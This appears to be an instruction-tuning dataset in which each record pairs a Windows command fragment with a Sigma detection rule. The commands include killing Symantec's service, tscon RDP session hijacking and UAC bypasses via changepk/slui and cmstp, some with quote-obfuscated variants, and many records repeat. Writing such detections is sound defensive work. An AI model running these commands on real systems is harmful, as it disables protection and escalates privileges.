{"instruction": "Write Sigma rule to detect payload:", "input": "taskkill /F /IM ccSvcHst.exe", "output": "title: Taskkill Symantec Endpoint Protection\nid: 4a6713f6-3331-11ed-a261-0242ac120002\nstatus: test\ndescription: |\n    Detects one of the possible scenarios for disabling Symantec Endpoint Protection.\n    Symantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\n    As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\nreferences:\n    - https://www.exploit-db.com/exploits/37525\n    - https://community.spiceworks.com/topic/2195015-batch-script-to-uninstall-symantec-endpoint-protection\n    - https://community.broadcom.com/symantecenterprise/communities/community-home/digestviewer/viewthread?MessageKey=6ce94b67-74e1-4333-b16f-000b7fd874f0&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=digestviewer\nauthor: Ilya Krestinichev, Florian Roth (Nextron Systems)\ndate: 2022-09-13\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'taskkill'\n            - ' /F '\n            - ' /IM '\n            - 'ccSvcHst.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tasklist.exe tasklist.exe -m rdpcorets.dll", "output": "title: Loaded Module Enumeration Via Tasklist.EXE\nid: 34275eb8-fa19-436b-b959-3d9ecd53fa1f\nstatus: test\ndescription: |\n    Detects the enumeration of a specific DLL or EXE being used by a binary via \"tasklist.exe\".\n    This is often used by attackers in order to find the specific process identifier (PID) that is using the DLL in question.\n    In order to dump the process memory or perform other nefarious actions.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\nmodified: 2024-03-13\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tasklist.exe'\n        - OriginalFileName: 'tasklist.exe'\n    selection_flags:\n        CommandLine|contains|windash: '-m'\n    selection_module:\n        # Note: add other interesting modules or binaries\n        CommandLine|contains: 'rdpcorets.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tasklist.exe \\\"tasklist.exe\\\" \\\"-m\\\" rdpcorets.dll", "output": "title: Loaded Module Enumeration Via Tasklist.EXE\nid: 34275eb8-fa19-436b-b959-3d9ecd53fa1f\nstatus: test\ndescription: |\n    Detects the enumeration of a specific DLL or EXE being used by a binary via \"tasklist.exe\".\n    This is often used by attackers in order to find the specific process identifier (PID) that is using the DLL in question.\n    In order to dump the process memory or perform other nefarious actions.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\nmodified: 2024-03-13\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tasklist.exe'\n        - OriginalFileName: 'tasklist.exe'\n    selection_flags:\n        CommandLine|contains|windash: '-m'\n    selection_module:\n        # Note: add other interesting modules or binaries\n        CommandLine|contains: 'rdpcorets.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tasklist tasklist -m rdpcorets.dll", "output": "title: Loaded Module Enumeration Via Tasklist.EXE\nid: 34275eb8-fa19-436b-b959-3d9ecd53fa1f\nstatus: test\ndescription: |\n    Detects the enumeration of a specific DLL or EXE being used by a binary via \"tasklist.exe\".\n    This is often used by attackers in order to find the specific process identifier (PID) that is using the DLL in question.\n    In order to dump the process memory or perform other nefarious actions.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\nmodified: 2024-03-13\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tasklist.exe'\n        - OriginalFileName: 'tasklist.exe'\n    selection_flags:\n        CommandLine|contains|windash: '-m'\n    selection_module:\n        # Note: add other interesting modules or binaries\n        CommandLine|contains: 'rdpcorets.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tasklist.exe rdpcorets.dll -m tasklist.exe", "output": "title: Loaded Module Enumeration Via Tasklist.EXE\nid: 34275eb8-fa19-436b-b959-3d9ecd53fa1f\nstatus: test\ndescription: |\n    Detects the enumeration of a specific DLL or EXE being used by a binary via \"tasklist.exe\".\n    This is often used by attackers in order to find the specific process identifier (PID) that is using the DLL in question.\n    In order to dump the process memory or perform other nefarious actions.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\nmodified: 2024-03-13\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\tasklist.exe'\n        - OriginalFileName: 'tasklist.exe'\n    selection_flags:\n        CommandLine|contains|windash: '-m'\n    selection_module:\n        # Note: add other interesting modules or binaries\n        CommandLine|contains: 'rdpcorets.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\taskmgr.exe", "output": "title: Taskmgr as LOCAL_SYSTEM\nid: 9fff585c-c33e-4a86-b3cd-39312079a65f\nstatus: test\ndescription: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-18\nmodified: 2022-05-27\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\taskmgr.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\taskmgr.exe\\\"", "output": "title: Taskmgr as LOCAL_SYSTEM\nid: 9fff585c-c33e-4a86-b3cd-39312079a65f\nstatus: test\ndescription: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-18\nmodified: 2022-05-27\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\taskmgr.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\taskmgr", "output": "title: Taskmgr as LOCAL_SYSTEM\nid: 9fff585c-c33e-4a86-b3cd-39312079a65f\nstatus: test\ndescription: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-18\nmodified: 2022-05-27\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\taskmgr.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\taskmgr.exe", "output": "title: Taskmgr as LOCAL_SYSTEM\nid: 9fff585c-c33e-4a86-b3cd-39312079a65f\nstatus: test\ndescription: Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-18\nmodified: 2022-05-27\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\taskmgr.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tpmvscmgr.exe TpmVscMgr.exe create", "output": "title: New Virtual Smart Card Created Via TpmVscMgr.EXE\nid: c633622e-cab9-4eaa-bb13-66a1d68b3e47\nstatus: test\ndescription: Detects execution of \"Tpmvscmgr.exe\" to create a new virtual smart card.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\tpmvscmgr.exe'\n        OriginalFileName: 'TpmVscMgr.exe'\n    selection_cli:\n        CommandLine|contains: 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tpmvscmgr.exe \\\"T\\\"\\\"p\\\"\\\"m\\\"\\\"V\\\"\\\"s\\\"\\\"c\\\"\\\"M\\\"\\\"g\\\"\\\"r\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" create", "output": "title: New Virtual Smart Card Created Via TpmVscMgr.EXE\nid: c633622e-cab9-4eaa-bb13-66a1d68b3e47\nstatus: test\ndescription: Detects execution of \"Tpmvscmgr.exe\" to create a new virtual smart card.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\tpmvscmgr.exe'\n        OriginalFileName: 'TpmVscMgr.exe'\n    selection_cli:\n        CommandLine|contains: 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tpmvscmgr.exe TpmVscMgr.exe create", "output": "title: New Virtual Smart Card Created Via TpmVscMgr.EXE\nid: c633622e-cab9-4eaa-bb13-66a1d68b3e47\nstatus: test\ndescription: Detects execution of \"Tpmvscmgr.exe\" to create a new virtual smart card.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\tpmvscmgr.exe'\n        OriginalFileName: 'TpmVscMgr.exe'\n    selection_cli:\n        CommandLine|contains: 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tpmvscmgr TpmVscMgr create", "output": "title: New Virtual Smart Card Created Via TpmVscMgr.EXE\nid: c633622e-cab9-4eaa-bb13-66a1d68b3e47\nstatus: test\ndescription: Detects execution of \"Tpmvscmgr.exe\" to create a new virtual smart card.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\tpmvscmgr.exe'\n        OriginalFileName: 'TpmVscMgr.exe'\n    selection_cli:\n        CommandLine|contains: 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tpmvscmgr.exe TpmVscMgr.exe create", "output": "title: New Virtual Smart Card Created Via TpmVscMgr.EXE\nid: c633622e-cab9-4eaa-bb13-66a1d68b3e47\nstatus: test\ndescription: Detects execution of \"Tpmvscmgr.exe\" to create a new virtual smart card.\nreferences:\n    - https://learn.microsoft.com/en-us/windows/security/identity-protection/virtual-smart-cards/virtual-smart-card-tpmvscmgr\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-06-15\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\tpmvscmgr.exe'\n        OriginalFileName: 'TpmVscMgr.exe'\n    selection_cli:\n        CommandLine|contains: 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage by an administrator\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tscon.exe", "output": "title: Suspicious TSCON Start as SYSTEM\nid: 9847f263-4a81-424f-970c-875dab15b79b\nstatus: test\ndescription: Detects a tscon.exe start as LOCAL SYSTEM\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\n    - https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-17\nmodified: 2022-05-27\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\tscon.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"t\"\"s\"\"c\"\"o\"\"n\"\".\"\"e\"\"x\"\"e\"", "output": "title: Suspicious TSCON Start as SYSTEM\nid: 9847f263-4a81-424f-970c-875dab15b79b\nstatus: test\ndescription: Detects a tscon.exe start as LOCAL SYSTEM\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\n    - https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-17\nmodified: 2022-05-27\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\tscon.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tscon", "output": "title: Suspicious TSCON Start as SYSTEM\nid: 9847f263-4a81-424f-970c-875dab15b79b\nstatus: test\ndescription: Detects a tscon.exe start as LOCAL SYSTEM\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\n    - https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-17\nmodified: 2022-05-27\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\tscon.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tscon.exe", "output": "title: Suspicious TSCON Start as SYSTEM\nid: 9847f263-4a81-424f-970c-875dab15b79b\nstatus: test\ndescription: Detects a tscon.exe start as LOCAL SYSTEM\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\n    - https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-17\nmodified: 2022-05-27\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        Image|endswith: '\\tscon.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/dest:rdp-tcp#", "output": "title: Suspicious RDP Redirect Using TSCON\nid: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb\nstatus: test\ndescription: Detects a suspicious RDP session redirect using tscon.exe\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\n    - https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-17\nmodified: 2023-05-16\ntags:\n    - attack.lateral-movement\n    - attack.t1563.002\n    - attack.t1021.001\n    - car.2013-07-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ' /dest:rdp-tcp#'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/dest:rdp-tcp#", "output": "title: Suspicious RDP Redirect Using TSCON\nid: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb\nstatus: test\ndescription: Detects a suspicious RDP session redirect using tscon.exe\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\n    - https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-17\nmodified: 2023-05-16\ntags:\n    - attack.lateral-movement\n    - attack.t1563.002\n    - attack.t1021.001\n    - car.2013-07-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ' /dest:rdp-tcp#'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/dest:rdp-tcp#", "output": "title: Suspicious RDP Redirect Using TSCON\nid: f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb\nstatus: test\ndescription: Detects a suspicious RDP session redirect using tscon.exe\nreferences:\n    - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\n    - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\n    - https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-17\nmodified: 2023-05-16\ntags:\n    - attack.lateral-movement\n    - attack.t1563.002\n    - attack.t1021.001\n    - car.2013-07-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ' /dest:rdp-tcp#'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tscon.exe tscon.exe", "output": "title: Potential RDP Session Hijacking Activity\nid: 224f140f-3553-4cd1-af78-13d81bf9f7cc\nstatus: test\ndescription: Detects potential RDP Session Hijacking activity on Windows systems\nreferences:\n    - https://twitter.com/Moti_B/status/909449115477659651\nauthor: '@juju4'\ndate: 2022-12-27\nmodified: 2024-12-01\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\tscon.exe'\n        - OriginalFileName: 'tscon.exe'\n    selection_integrity:\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tscon.exe \\\"tscon.exe\\\"", "output": "title: Potential RDP Session Hijacking Activity\nid: 224f140f-3553-4cd1-af78-13d81bf9f7cc\nstatus: test\ndescription: Detects potential RDP Session Hijacking activity on Windows systems\nreferences:\n    - https://twitter.com/Moti_B/status/909449115477659651\nauthor: '@juju4'\ndate: 2022-12-27\nmodified: 2024-12-01\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\tscon.exe'\n        - OriginalFileName: 'tscon.exe'\n    selection_integrity:\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tscon tscon", "output": "title: Potential RDP Session Hijacking Activity\nid: 224f140f-3553-4cd1-af78-13d81bf9f7cc\nstatus: test\ndescription: Detects potential RDP Session Hijacking activity on Windows systems\nreferences:\n    - https://twitter.com/Moti_B/status/909449115477659651\nauthor: '@juju4'\ndate: 2022-12-27\nmodified: 2024-12-01\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\tscon.exe'\n        - OriginalFileName: 'tscon.exe'\n    selection_integrity:\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tscon.exe tscon.exe", "output": "title: Potential RDP Session Hijacking Activity\nid: 224f140f-3553-4cd1-af78-13d81bf9f7cc\nstatus: test\ndescription: Detects potential RDP Session Hijacking activity on Windows systems\nreferences:\n    - https://twitter.com/Moti_B/status/909449115477659651\nauthor: '@juju4'\ndate: 2022-12-27\nmodified: 2024-12-01\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\tscon.exe'\n        - OriginalFileName: 'tscon.exe'\n    selection_integrity:\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\changepk.exe \\slui.exe", "output": "title: UAC Bypass Using ChangePK and SLUI\nid: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc\nstatus: test\ndescription: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\nreferences:\n    - https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b\n    - https://github.com/hfiref0x/UACME\n    - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\changepk.exe'\n        ParentImage|endswith: '\\slui.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\changepk.exe \\\"\\\\\"\\\"s\\\"\\\"l\\\"\\\"u\\\"\\\"i\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\"", "output": "title: UAC Bypass Using ChangePK and SLUI\nid: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc\nstatus: test\ndescription: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\nreferences:\n    - https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b\n    - https://github.com/hfiref0x/UACME\n    - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\changepk.exe'\n        ParentImage|endswith: '\\slui.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\changepk \\slui", "output": "title: UAC Bypass Using ChangePK and SLUI\nid: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc\nstatus: test\ndescription: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\nreferences:\n    - https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b\n    - https://github.com/hfiref0x/UACME\n    - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\changepk.exe'\n        ParentImage|endswith: '\\slui.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\changepk.exe \\slui.exe", "output": "title: UAC Bypass Using ChangePK and SLUI\nid: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc\nstatus: test\ndescription: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\nreferences:\n    - https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b\n    - https://github.com/hfiref0x/UACME\n    - https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf\nauthor: Christian Burkard (Nextron Systems)\ndate: 2021-08-23\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\changepk.exe'\n        ParentImage|endswith: '\\slui.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'System'\n            - 'S-1-16-16384' # System\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmstp.exe CMSTP.EXE /s -s /au -au /ni -ni", "output": "title: Bypass UAC via CMSTP\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nstatus: test\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2022-08-30\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\n    - attack.t1218.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmstp.exe'\n        - OriginalFileName: 'CMSTP.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n            - '/au'\n            - '-au'\n            - '/ni'\n            - '-ni'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of cmstp.exe utility by legitimate user\nlevel: high"}
